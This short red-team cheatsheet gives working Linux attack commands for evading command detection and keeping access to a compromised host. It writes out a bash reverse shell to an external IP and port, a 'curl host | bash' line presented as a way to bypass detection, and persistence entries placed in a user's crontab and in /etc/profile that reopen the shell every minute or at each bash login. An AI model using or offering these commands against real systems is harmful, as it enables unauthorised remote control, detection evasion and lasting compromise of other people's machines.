## Network
- [OpenSSL encryption](https://github.com/Jayway007/Offense-and-Deffense/blob/main/Offense/Red-Team/Execution/Reverse-Shell/Cheatsheet.md#openssl)

## Host
- Use curl to bypass commands detection
  - Set up a web server and write content in :
  ```
  bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
  ```
  - Then execute cmd below to bypass cmd detection:
  ```
  curl 47.xxx.xxx.72|bash
  ```
- Write shell to crontab or profile
  - Write shell content to file _/var/spool/cron/crontabs/username_:
  ```
  */1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1
  
  # minute hour day month week
  ```
  - or write to _/etc/profile_, the bash will be executed when user open bash window:
  ```
  /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
  ```
